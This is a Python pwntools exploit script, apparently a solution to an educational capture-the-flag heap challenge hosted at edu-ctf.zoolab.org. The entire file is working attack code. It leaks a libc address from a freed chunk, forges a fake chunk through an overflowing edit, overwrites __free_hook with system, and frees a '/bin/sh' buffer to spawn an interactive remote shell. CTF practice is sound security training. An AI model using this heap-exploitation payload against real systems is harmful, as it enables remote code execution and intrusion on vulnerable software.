from pwn import *

ip = 'edu-ctf.zoolab.org'
port = 10007

def add(idx,name):
    s.sendafter(b'>','1')
    s.sendlineafter(b'>',str(idx))
    s.sendlineafter(b'>',str(name))
    #print(s.recvuntil(b'>'))

def edit(idx,size,data):
    s.sendafter(b'>','2')
    s.sendlineafter(b'>',str(idx))
    s.sendlineafter(b'>',str(size))
    s.send(data)
    #print(s.recvuntil(b'>'))

def show():
    s.sendafter(b'>','4')
    return s.recvuntil(b'1.')[:-2]

def delete(idx):
    s.sendafter(b'>','3')
    s.sendlineafter(b'>',str(idx))
    #print(s.recvuntil(b'>'))

#s = process('chal')
s = remote(ip, port)
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
#gdb.attach(proc.pidof(s)[0])

add(0,'A'*8)
edit(0,0x418,'A')

add(1,'B'*8)
edit(1,0x18,'B')

add(2,'C'*8)

delete(0)

temp = show()
leak_addr = temp.split(b'\n')[1][6:12]
leak_addr = u64(leak_addr.ljust(8,b'\x00'))
print("ORIGIN: ",temp)
print("ADDR: ",hex(leak_addr))

libc_addr = leak_addr - 0x1ecbe0
free_hook = libc_addr + 0x1eee48
system = libc_addr + 0x52290

fake_chunk = flat(
    0          ,       0x21,
    b'CCCCCCCC',b'CCCCCCCC',
    free_hook,
)

data = b'/bin/sh\x00'.ljust(0x10,b'B')
edit(1,0x38,data+fake_chunk)
edit(2,0x8,p64(system))
delete(1)


s.interactive()

